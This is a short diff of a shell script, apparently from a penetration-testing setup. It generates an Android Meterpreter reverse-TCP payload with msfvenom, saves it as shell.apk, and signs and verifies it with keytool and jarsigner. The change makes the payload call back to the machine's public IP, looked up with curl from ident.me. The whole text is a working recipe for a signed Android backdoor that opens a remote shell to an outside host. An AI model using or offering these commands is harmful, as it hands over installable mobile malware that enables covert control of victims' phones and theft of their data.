@@ -1,4 +1,4 @@
-msfvenom -p android/meterpreter/reverse_tcp LPORT=4433 R> /pentest/share/shell.apk
+msfvenom -p android/meterpreter/reverse_tcp LPORT=4433 LHOST=$(curl ident.me) R> /pentest/share/shell.apk
 keytool -genkey -V -keystore key.keystore -alias msf -keyalg RSA -keysize 2048 -validity 10000
 jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore /pentest/share/shell.apk msf
 jarsigner -verify -verbose -certs /pentest/share/shell.apk
